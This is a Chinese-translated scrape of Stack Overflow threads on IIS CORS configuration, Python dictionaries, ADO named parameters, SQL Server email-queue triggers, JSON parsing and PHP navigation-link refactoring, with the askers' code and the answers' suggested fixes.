                <remove name="TRACEVerbHandler" />

                <add name="ExtensionlessUrlHandler-ISAPI-4.0_32bit" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll" preCondition="classicMode,runtimeVersionv4.0,bitness32" responseBufferLimit="0" />
                <add name="ExtensionlessUrlHandler-ISAPI-4.0_64bit" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" preCondition="classicMode,runtimeVersionv4.0,bitness64" responseBufferLimit="0" />
                <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
            </handlers>
            <httpProtocol>
                <customHeaders>
                    <add name="Access-Control-Allow-Origin" value="http://localhost" />
                    <add name="Access-Control-Allow-Headers" value="Origin, X-Requested-With, Content-Type, Accept, Cache-Control" />
                    <add name="Access-Control-Allow-Credentials" value="true" />
                    <add name="Access-Control-Allow-Methods" value="GET, POST, PUT, DELETE, OPTIONS" />
                </customHeaders>
            </httpProtocol>
      </system.webServer> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-04-16T18:38:54.677

在使用带有 Microsoft Web API 2 的 AngularJS 1.3 偶然发现这个问题时，我找到了 CORS 配置问题的简单解决方案。

*   首先来自 Nuget intall - Microsoft WebApi Cors

    ```
    Install-Package Microsoft.AspNet.WebApi.Cors 
    ```

*   然后在您的 WebApiConfig.cs 文件中：

    ```
    var cors = new System.Web.Http.Cors.EnableCorsAttribute("www.my-angular-web-site.com", "*", "*");

    config.EnableCors(cors); 
    ```

您也可以在任何地方使用 * 而不是您的网站启用 CORS，但这违背了 CORS 的目的并打开了安全漏洞 - 但您可以这样做以进行测试。

WebApi.Cors 程序集还允许您通过控制器或其他更精细的细节启用 cors 控制器。可以在 Web API 站点上找到其他详细[信息](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api#) 。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-18T09:46:12.230

查看 Thinktecture Cors 对象，使用这些（nugettable）您可以在 WebApi 中获得完整的 CORS 支持，而无需您自己的任何代码。

即使使用正确的 CORS 实现，我在 IIS 7 上遇到了一个非常奇怪的问题，通过启用 WebDav 的所有动词来解决（是的，WebDav - 不要问我为什么我只是按照博客文章中的说明进行操作 :-D）。

做这个：

*   打开 IIS 管理器，转到应用程序的处理程序映射。
*   双击 WebDav 处理程序
*   点击“请求限制”
*   在“动词”选项卡上，选择“所有动词”。

同样，不知道为什么 WebApi 使用 WebDav，但这解决了 POST 和 DELETE 的问题，尽管 CORS 实现正确，但仍无法正常工作。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2018-03-16T17:19:41.187

大多数开发人员在 Localhost 上运行 UI 和服务时都会遇到这个问题 - 有很多方法可以解决这个问题 - 许多开发人员倾向于在浏览器级别修复它“但这是一个安全漏洞。

正确的方法是在您的 Web 服务层解决此问题 - 以下视频将解释并解决此问题

观看[CORS - 实现跨域资源共享](https://www.youtube.com/watch?v=wvs5-C7NoRs&t=132s)（“解释 - 跨域资源共享”）！

# python - 在 python 中添加到字典。Python 文本 rpg

> ID：11786566
> 
> 赞同：0
> 
> 时间：2012-08-02T22:10:13.533
> 
> 标签：python

我正在制作一个文本 rpg，我需要一些帮助，我不完全确定如何解释。

我需要这样做，以便用户可以输入诸如“检查键”之类的内容，并且它将打印“它是键”。

我正在使用 2 个文件。

main.py 引擎.py

main.py 需要能够将对象附加到文件 engine.py 中的字典中

如果 engine.py 有

```
objects = {

} 
```

并且 main.py 有

```
key = {'it's a key', 'key taken'}

engine.objects.append(key) 
```

我的主循环应该能够像

```
if choice[0] == 'examine':
    if choice[1] == anything in objects:
        print whatever object[0] 
```

如果这有任何意义，你能指出我正确的方向吗？

编辑：我不能附加到字典。

```
 Traceback (most recent call last):
  File "...\main.py", line 5, in <module>
    engine.objects.append(key)
AttributeError: 'dict' object has no attribute 'append' 
```

EDIT2：很抱歉在这方面是个菜鸟。每当我输入“检查”时，没有第二个参数它会出错并关闭。我知道为什么，但我不知道如何解决它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:44:01.263

引擎对象应该是一个列表，所以你可以在那里附加键，现在我不明白为什么你需要创建 2 个不同的文件，但我会做一个小例子，也许它可以更好地指导你：

```
choices = {'what's your name': 'I am jorge beans', 'left': 'there is a door',
              'punch': 'ouch!'}

if user_choice in keys:  
    # this way you examine the key values in the choices dictionary so you
    # don't need the objects list
    print choices[user_choice] 
```

如果您再详细说明您的问题，我肯定会更具体地回答我的问题。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:44:41.770

类中没有`.append()`方法`dict`。

要将键/值对插入字典`d`：

```
d[key] = value 
```

检查是否`d`包含键并获取对应的值：

```
command, obj = "examine box".split()
if command == 'examine':
   if obj in d:
      print d[obj] 
```

尽量避免可变的全局变量，例如`engine.objects`. 您可以将对它的访问封装在一个类中。

例如，您可以基于[`cmd`stdlib 中的模块来](http://docs.python.org/library/cmd.html)构建您的程序。

# sql-server - 当命令类型为 adCmdText 时是否可以使用命名参数？

> ID：11786567
> 
> 赞同：1
> 
> 时间：2012-08-02T22:10:14.583
> 
> 标签：sql-server, asp-classic, vbscript, ado, named-parameters

我正在尝试通过 Adodb.Command 将命名参数与以下查询一起使用，但没有运气。

```
Select * From mytable Where col1 = Lower(@param1) And col2 = Upper(@param2) And col3 = @param1 
```

我使用类似的代码。

```
Dim cmd
Set cmd = Server.CreateObject("Adodb.Command")
cmd.NamedParameters = True
cmd.CommandType = adCmdText
cmd.CommandText = "Select * From mytable Where col1 = Lower(@param1) And col2 = Upper(@param2) And col3 = @param1"
cmd.Parameters.Append cmd.CreateParameter("@param1", adVarchar, adParamInput, 20, "some text 1")
cmd.Parameters.Append cmd.CreateParameter("@param2", adVarchar, adParamInput, 20, "some text 2")
Set cmd.ActiveConnection = cn
Dim rs
Set rs = cmd.Execute 
```

问题是，这会导致 RDBMS 端出现错误。

```
Microsoft OLE DB Provider for SQL Server error '80040e14' 

Must declare the scalar variable "@param1". 
```

如果查询是存储过程调用，则没有任何问题。所以，我猜**[命名参数](http://msdn.microsoft.com/en-us/library/windows/desktop/ms675840%28v=vs.85%29.aspx)**只影响调用存储过程的命令对象。当我使用 SQL Server Profiler 跟踪查询时，我看到只运行了以下查询*（请注意，没有参数声明，没有值分配）*。

```
SQL:BatchStarting   Select * From mytable Where col1 = Lower(@param1) And col2 = Upper(@param2)
SQL:BatchCompleted  Select * From mytable Where col1 = Lower(@param1) And col2 = Upper(@param2) 
```

但是我需要在本机变化查询上执行此操作。我该怎么做，没有字符串连接等的最佳实践是什么。我不想准备带有问号的查询，我不喜欢按顺序传递参数（它必须带有问号且没有命名参数）并多次。任何帮助将不胜感激。

**误解更新：**我正在寻找一个不依赖于数据库的通用解决方案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-03T03:11:50.367

您不能在 OLE DB 中将命名参数与即席查询一起使用。如果您使用的是 SQL Server，则可以执行以下操作：

```
Dim sql
sql = ""
sql = sql & "DECLARE @param1 varchar(20) = ?;"
sql = sql & "DECLARE @param2 varchar(20) = ?;"
sql = sql & "Select * From mytable Where col1 = Lower(@param1) And col2 = Upper(@param2) And col3 = @param1;"

' This section is basically the same as in the original question
Dim cmd
Set cmd = Server.CreateObject("Adodb.Command")
cmd.CommandType = adCmdText
cmd.CommandText = sql
cmd.Parameters.Append cmd.CreateParameter("@param1", adVarchar, adParamInput, 20, "some text 1")
cmd.Parameters.Append cmd.CreateParameter("@param2", adVarchar, adParamInput, 20, "some text 2")
Set cmd.ActiveConnection = cn
Dim rs
Set rs = cmd.Execute 
```

您仍然必须在位置上绑定参数，但这样更容易看到正确的顺序，并且您可以在多个位置使用相同的参数。

# sql - 创建状态更新触发器

> ID：11786568
> 
> 赞同：0
> 
> 时间：2012-08-02T22:10:20.360
> 
> 标签：sql, sql-server, sql-server-2005, triggers

我有两张这样的桌子：

**工作**表

```
Jobcode    UserId    Status
101        130       R
102        139       D 
```

**用户**表

```
UserId    Email
130       test@example.com 
```

我想在插入和更新时创建一个触发器，将电子邮件发送到我的存储过程：

```
EXEC dbo.SendMyEmail @email, @jobcode; 
```

当作业代码作为“D”插入或更新为“D”时。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-03T05:26:22.597

在我看来，在触发器中发送电子邮件并不是最佳选择。

相反，您应该只插入到队列表中，并让一个进程经常运行来检查表并发送电子邮件。

如果您在电子邮件过程中遇到错误会怎样？它将强制回滚您的作业完成状态。只有你知道那是次要的还是可能是灾难性的。但我可以肯定地告诉你，数据库的最佳实践是在 DML 操作期间不进行扩展 I/O。

```
CREATE TRIGGER TR_Jobs_EnqueueEmail_IU ON dbo.Jobs FOR INSERT, UPDATE
AS
SET NOCOUNT ON;
INSERT dbo.EmailQueue (UserID, JobCode)
SELECT UserID, JobCode
FROM
   Inserted I
   LEFT JOIN Deleted D
      ON I.JobCode = D.JobCode -- or proper PK columns
WHERE
   IsNull(D.Status, 'R') <> 'D'
   AND I.Status = 'D'; 
```

需要的表：

```
CREATE TABLE dbo.EmailQueue (
   QueuedDate datetime NOT NULL
      CONSTRAINT DF_EmailQueue_QeueueDate DEFAULT (GetDate()),
   UserID int NOT NULL,
   JobCode int NOT NULL,
   CONSTRAINT PK_EmailQueue PRIMARY KEY CLUSTERED (QueuedDate, UserID, JobCode)
);

CREATE TABLE dbo.EmailSent (
   SentDate datetime NOT NULL
      CONSTRAINT DF_EmailSent_SentDate DEFAULT (GetDate()),
   QueuedDate datetime NOT NULL,
   UserID int NOT NULL,
   JobCode int NOT NULL,
   CONSTRAINT PK_EmailSent PRIMARY KEY CLUSTERED (SentDate, QueuedDate, UserID, JobCode)
); 
```

然后，从 SQL 作业中每分钟运行一次以下存储过程：

```
CREATE PROCEDURE dbo.EmailProcess
AS
DECLARE @Email TABLE (
   QueuedDate datetime,
   UserID int,
   JobCode int
);
DECLARE
   @EmailAddress nvarchar(255),
   @JobCode int;

WHILE 1 = 1 BEGIN

   DELETE TOP 1 Q.*
   OUTPUT Inserted.QueuedDate, Inserted.UserID, Inserted.JobCode
   INTO @Email (QueuedDate, UserID, JobCode)
   FROM dbo.EmailQueue Q WITH (UPDLOCK, ROWLOCK, READPAST)
   ORDER BY QueuedDate;

   IF @@RowCount = 0 RETURN;

   SELECT @EmailAddress = U.EmailAddress, @JobCode = E.JobCode
   FROM
      @Email E
      INNER JOIN dbo.User U
         ON E.UserID = U.UserID;

   EXEC dbo.SendMyEmail @EmailAddress, @JobCode;

   DELETE E
   OUTPUT QueuedDate, UserID, JobCode
   INTO dbo.EmailSent (QueuedDate, UserID, JobCode)
   FROM @Email E;

END; 
```

我使用的删除模式和锁是经过特别选择的。如果您更改它们或*以任何方式*更改删除模式，几乎可以肯定您会破坏它。处理锁和并发是*困难*的。不要改变它。

注意：我没有在 SQL Server 上检查任何内容就输入了以上所有内容。很可能有错别字。请原谅任何人。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:33:32.023

我不确定数据类型等，但这至少应该让你走上正轨。希望能帮助到你...

```
CREATE TRIGGER SendEmailOnStatusD

ON JOBS

-- trigger is fired when an update is made for the table
FOR UPDATE --You can add the same for INSERT

AS

    -- holds the UserID so we know which Customer was updated
    DECLARE @UserID int
    DECLARE @JobCode int

    SELECT @UserID = UserId, @JobCode = JobCode 
    FROM INSERTED WHERE [Status] = 'D' --If you want the old value before the update, use 'deleted' table instead of 'inserted' table

    IF (@UserID IS NOT NULL)
    BEGIN

        -- holds the email
        DECLARE @email varchar(250)

        SELECT @email = Email FROM USERS WHERE UserId = @UserID

        EXEC SendMyEmail (@email, @jobcode);

    END

GO 
```

**编辑**：

上面的代码不处理多个更新，所以为了更好的实践，请参见下面的选项

```
CREATE TRIGGER SendEmailOnStatusD ON JOBS

-- trigger is fired when an update is made for the table
FOR UPDATE --You can add the same for INSERT

AS

    DECLARE @Updates table(UserID int, JobCode int, Email varchar(250))

    INSERT INTO @Updates (UserID, JobCode, Email)
    SELECT i.UserID, i.JobCode, u.Email
    FROM INSERTED i
        JOIN USERS u ON i.UserID = u.UserID
    WHERE [Status] = 'D'

    DECLARE @UserID int
    DECLARE @JobCode int
    DECLARE @Email varchar(250)

    WHILE EXISTS(SELECT * FROM @Updates)
    BEGIN

        SELECT TOP 1
            @UserID = UserID,
            @Email = Email, 
            @JobCode = JobCode
        FROM @Updates WHERE UserID = @UserID

        EXEC SendMyEmail (@email, @jobcode);

        DELETE FROM @Updates
        WHERE UserID = @UserID

    END

GO 
```

此外，正如评论中所讨论的，从触发器发送电子邮件也不是最好的，但因为这是问题所要求的，所以已包含在内。我会推荐发送电子邮件的替代选项，例如其他答案中提到的队列。

# javascript - 如何在 JavaScript 中解析漂亮的 JSON

> ID：11786574
> 
> 赞同：4
> 
> 时间：2012-08-02T22:11:30.707
> 
> 标签：javascript, json, parsing

> **可能重复：**
> [如何在 JavaScript 中解析 JSON](https://stackoverflow.com/questions/4935632/how-to-parse-json-in-javascript)

如果您的 JSON 格式如下：

```
{
  "id": 10,
  "user": {
    "email": "example.com"
  }
} 
```

在 JavaScript 中将其解析为 JSON 对象的标准方法是什么？用例是如果用户将 JSON 输入到 textarea 中，然后将其解析出来。

我开始这样做，但如果已经有一个强大/标准的解决方案，我不想走这条路：

```
JSON.parse($('#the-textarea').val().replace(/^\s+/mg, '').replace(/\n/g, '')); // not quite right yet, still not parsable... 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:13:12.713

你不需要做任何事情。这个不重要的空格不会导致无效的 JSON，并且会被解析器忽略。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:16:14.913

这应该可以解决问题：

```
var result = jQuery.parseJSON(jQuery('#the-textarea').val()); 
```

顺便说一句，您的示例不是有效的 JSON，它缺少逗号。这是一个有效的 JSON 示例：

```
{
  "id": 10,
  "user": {
    "email": "example.com"
  }
} 
```

[http://jsonlint.com/](http://jsonlint.com/)是你的朋友；）

# php - 有没有办法让这个 PHP 代码更高效？

> ID：11786575
> 
> 赞同：1
> 
> 时间：2012-08-02T22:11:40.333
> 
> 标签：php, html, css

我正在尝试在页面上创建一些“动态”链接。基本上我想删除我所在页面的链接。（例如，如果我在主页上，我不希望显示主页链接，但如果我在 FAQ 页面上，则会显示主页链接而不会显示常见问题解答链接。）此代码按我希望的方式工作工作，我只是认为必须有一种更好的方法，不会重复那么多代码，但在我有限的编程经验中，我可以看到它。

```
<div class= "links">
<?php
    switch ($page_title) {
            case 'Home':
            echo '<p class= "who">'.
                    '<a href="whois.php" tabindex="1"><img src=     "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
                 '</p>';
            echo '<p class= "contact">'.
                    '<a href="contact.php" tabindex="2"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="3"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="4"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="5"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'Who is BeeCharmer':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="2"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="3"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="4"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="5"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'Contact Us':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="3"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="4"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="5"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'What We Do':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="4"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="5"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'FAQ':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="4"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="5"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'Photo Gallery':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="4"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="5"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="6"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'Pollination Services':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="4"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="5"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="6"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pay">'.
                 '<a href="payus.php" tabindex="7"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>'.
             '</p>';
        break;

    case 'Pay Us':
        echo '<p class= "home">'.
                '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
              '</p>';
        echo '<p class= "who">'.
                '<a href="whois.php" tabindex="2"><img src= "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
             '</p>';
        echo '<p class= "contact">'.
                '<a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>'.
             '</p>';
        echo '<p class= "what">'.
                '<a href="whatwedo.php" tabindex="4"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>'.
             '</p>';
        echo '<p class ="FAQ">'.
                '<a href="faq.php" tabindex="5"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>'.
             '</p>';
        echo '<p class= "pics">'.
                '<a href="gallery.php" tabindex="6"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>'.
             '</p>';
        echo '<p class= "pollination">'.
                 '<a href="pollination.php" tabindex="7"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>'.
             '</p>';
        break;
} 
```

?>

这是样式化它的CSS。

```
div.links { width: 40%;
                    position: absolute;
                    top: 280px;
                    left: 2%;  }
        div.links p img { border: none; 
                          position: relative;
                          top: -29px;
                          left: 5px; }
        div.links p { background-image: url("../images/yellowSlidingDoorleft.png"),
                                        url("../images/yellowSlidingDoorRight.png"),
                                        url("../images/yellowSlidingDoorMiddle.png");
                      background-position: top left, top right, top center;
                      background-repeat: no-repeat, no-repeat, repeat; 
                      height: 38px;
                      width: 520px;
                      border: none;
                      overflow: hidden; }
        /*div.links p.home { position: relative;
                top: 0px;
                left: 0px; }
        div.links p.who { position: relative;
                top: 50px;
                left: 0px; }
        div.links p.contact { position: relative;
                top: 100px;
                left: 0px; }
        div.links p.what { position: relative;
                top: 150px;
                left: 0px; }
        div.links p.FAQ { position: relative;
                top: 200px;
                left: 0px; }
        div.links p.pics { position: relative;
                top: 250px;
                left: 0px; }
        div.links p.pollination { position: relative;
                top: 300px;
                left: 0px; }
        div.links p.pay { position: relative;
                top: 350px;
                left: 0px; }*/
        div.links p:hover img { position: relative;
                top: 5px;
                left: 5px; }
        div.links p:hover { background-image: url("../images/blackSlidingDoorleft.png"),
                                              url("../images/blackSlidingDoorRight.png"),
                                              url("../images/blackSlidingDoorMiddle.png");
                            background-position: top left, top right, top center;
                            background-repeat: no-repeat, no-repeat, repeat; } 
```

你们可以提供的任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:21:27.317

我认为你想要的是这样的：

```
<div class= "links">
<?php
    if ( $page_title != 'home') {
       echo '<p class= "home">'.
            '<a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>'.
            '</p>';
    }
    if ( $page_title != 'Who is BeeCharmer') {
       echo '<p class= "who">'.
            '<a href="whois.php" tabindex="2"><img src=     "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>'.
            '</p>';
    }

//and so on... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:17:05.710

`switch($page_title)`如果您实际上是为每个页面创建一个单独的列表（似乎暗示），那么简单地将该页面的链接列表作为 HTML 包含在该页面上会更有效。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T22:25:01.140

您可以通过函数删除多余的 HTML 代码。（在这种情况下有效，因为所有链接的格式都完全相同，只是某些元素，如 class、href、tabindex、imgsrc 和 img alt 不同）

```
function displayLinks ($pClass, $aHref, $tabIndex, $imgSRC, $alt) {
echo '<p class="' . $pClass . '"><a href="' . $aHref . '.php" tabindex="' . $tabIndex . '"><img src="' . $imgSRC . '" alt= "' . $alt . '" /></a>'</p>';
} 
```

会被称为

```
displayLinks('who','whois',1,'images/WhoIs.png','Who is BeeCharmer');
displayLinks('contact','contact',2,'images/ContactUs.png','Who is ContactUs'); 
```

等等

尽管由于您的大部分链接总体上都是相同的，但我会更进一步，仅对不同的链接保持条件。

```
what, faq, pics, pollination, pay 
```

存在于除首页和联系我们之外的所有地方。所以他们不需要重复或包含在他们自己的 if

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-03T01:45:08.590

您走在正确的轨道上，意识到您当前的解决方案不是动态的。许多没有经验的程序员似乎`switch`在这种情况下犯了使用语句的错误，当你真正想要的是动态代码访问数组时，正如@Torsten 提出的那样。您也不需要`if`像 PeterVR 的答案那样重复声明，或者像 DaiYoukai 那样重复的函数调用。将重复放入一个数组中可以为您提供一个灵活的动态结构，您可以通过编程方式访问和操作该结构。

尝试这样的事情（将您需要的任何其他键值对添加到数组中）：

```
$nav_items = array(

  'home' => array(

    'class' => 'home',

    'href' => "index.php",

    'src' => "HomePage"

    'label' => "Home Page"

  ),
  // home

  'whois' => array(

    'class' => 'who',

    'href' => "...",

    'src' => "..."

    'label' => "..."

  ),
  // whois

  ...

);
// $nav_items

$nav_sets = array(

  'home' => array(

    'whois',

    'contact',

    'whatwedo',

    'faq',

    'gallery',

    'pollination',

    'payus'

  ),

  'whois' => array(

    'home',

    'contact',

    'whatwedo',

    'faq',

    'pics',

    'pollination'

  ),

  ...

);
// $nav_sets

foreach ( $nav_sets[ $page_title ] as $nav_id ) {

  $nav_item = $nav_items[ $nav_id ];

  echo <<<DOCHERE

<p class="{$nav_item[ 'class' ]}">
<a href="{$nav_item[ 'href' ]}" tabindex="1"><img src="images/{$nav_item[ 'src' ]}.png" alt= "{$nav_item[ 'label' ]}" /></a>
</p>

DOCHERE;

}
// foreach 
```

这与您的使用不完全匹配`$page_title`- 我只是在每个页面中放置一个变量，例如，它与and数组`$nav_id`中的键匹配。`$nav_items``$nav_sets`

在这里，您拥有每个导航项的一份数据副本，它可能出现在任意数量的页面上，以及一个用于为所有项生成 HTML 输出的模板。这消除了有问题的重复。这个例子包括明确的项目集，以防您需要那么多控制。如果您只需要在每个页面上显示除与当前页面对应的项目之外的所有项目，那么您可以循环`$nav_items`并排除当前页面。

我还消除了使用字符串连接来构建输出的可怕用途。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-02T22:26:11.787

您不必，也可能永远必须像这样直接回显 HTML。由于我认为这是一个视图文件，因此我将导航放入其自己的文件中，然后执行`require('nav_links.php');`当前链接所在的位置，内容`nav_links.php`如下所示

`nav_links.php`

```
<div class= "links">
<?php if($page_title != 'home'): ?>
<p class= "home">.
    <a href="index.php" tabindex="1"><img src= "images/HomePage.png"  alt= "Home Page" /></a>.
</p>
<?php endif; ?>
<?php if($page_title != 'Who is BeeCharmer'): ?>
 <p class= "who">
    <a href="whois.php" tabindex="2"><img src=     "images/WhoIs.png" alt= "Who is BeeCharmer" /></a>
 </p>
<?php endif; ?>
<?php if($page_title != 'Contact Us'): ?>
 <p class= "contact">
        <a href="contact.php" tabindex="3"><img src= "images/ContactUs.png" alt= "Contact Us" /></a>
 </p>
<?php endif; ?>
<?php if($page_title !=  'What We Do'): ?>
<p class= "what">
    <a href="whatwedo.php" tabindex="4"><img src= "images/WhatWeDo.png" alt= "What Does BeeCharmer Do" /></a>
</p>
<?php endif; ?>
<?php if($page_title != 'FAQ'): ?>
 <p class ="FAQ">
    <a href="faq.php" tabindex="5"><img src= "images/FAQ.png" alt= "Frequently Asked Questions" /></a>
 </p>
<?php endif; ?>
